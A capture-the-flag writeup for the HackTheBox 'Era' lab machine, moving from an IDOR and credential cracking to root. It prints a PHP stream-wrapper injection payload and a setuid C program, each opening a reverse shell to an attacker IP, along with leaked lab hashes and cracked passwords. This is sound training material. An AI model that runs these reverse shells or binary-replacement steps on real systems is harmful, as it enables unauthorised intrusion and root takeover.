# Era HackTheBox Writeup

Difficulty: Medium

## Enumeration

First run masscan to get the open ports. I got 21,80.

Port 80 had the domain name era.htb so I added it into the hosts file.

There is nothing of value here so I fuzzed subdomains using 
```bash
ffuf -u "http://era.htb" -H "Host: FUZZ.era.htb" -fl 8 -w /usr/share/wordlists/dirb/common.txt
```

There I got the subdomain `file.era.htb`. So I registered it in hosts.

Now here, there is a file upload service. On fuzzing it a little we get a `/register.php`. So I registered a user and logged in. This appears to be some sort of file upload service.

There is a `download.php` endpoint which allows us to download uploaded files. But this appeared to be an IDOR since you can input any id here. So I fuzzed the IDs to get a valid id 54. This contained a backup of the site. So I downloaded it.

## Initial Access
Now from here we can download the file to analyze its contents. In it there is a database, whose users table contains this data:
```
admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
```

Out of these only 2 are crackable giving us credentials:
```
eric:america
yuri:mustang
```
We also get the actual admin username.

To gain admin access we don't need to go any further for now. We can go to the reset security questions page and then change the answers there. Use that to login as admin, via the `/security_login.php` endpoint.

Here we can see another file signing.zip. Download that it will be useful for later.

On the code review for download.php, I found that it did not validate the format parameter, which essentially allowed us to add any php stream wrapper.

I used a lot of ChatGPT to arrive at this payload to login as yuri (my attempts to use this to login as eric didnt work)
```
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash -c "bash -i >& /dev/tcp/10.10.x.x/4444 0>&1";
```

I url encoded this via burpsuite and sent it. Make sure to keep a tcp listener running on port 4444 while using this payload.

Now we gain a shell as yuri, but not user.txt

For that we need to simply login as eric. I stabilized my shell and then used the `su` command and the password we cracked for eric to login as eric. There we gain user.

## Privilege Escalation

So I downloaded `linpeas.sh` to the machine. And this seemed interesting: 
```
╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                             
  Group eric:                                                                                                                                                
/tmp/privesc                                                                                                                                                 
/tmp/privesc/report.txt
/tmp/privesc/linpeas.sh
  Group devs:
/opt/AV                                                                                                                                                      
/opt/AV/periodic-checks
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

So there was a binary called monitor that was writable. Interesting 🤔.

***NOTE: From here on out I had a LOT of help to figure this part out since its completely new to me***

<!--I used this writeup https://lazyhackers.in/posts/era-htb-writeup-hackthebox-season-8-->
<!--https://insidepwn.com/hackthebox-era-walkthrough-->

Now I know a couple of classic ways to exploit writable binaries, but they didnt work. Instead what I found was that this binary was to be signed using specific keys which we can find in signing.zip

So what we can do is this:

1. Create an exploit.c file containing this:
```c
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.xx.xx/1337 0>&1", NULL);
    return 0;
}
```
2. Compile it using this: 
```bash
gcc -o monitor exploit.c -static
```

3. Use these commands to setup the tool to sign the malicious binary:
```bash
git clone https://github.com/NUAA-WatchDog/linux-elf-binary-signer.git
cd linux-elf-binary-signer
make clean
gcc -o elf-sign elf_sign.c -lssl -lcrypto -Wno-deprecated-declarations
```

4. Download this binary, replacing the original monitor binary on the target machine.

5. Start a listener on port 1337 of your kali linux and run this binary on your target machine. It will give root shell.

## Final Thoughts
Learned lots of new things on this machine. Hope to keep cooking with the next one. Since this season had a majority of windows machines I didnt grind it as much as i should have, will cook from next season.

Bye :)
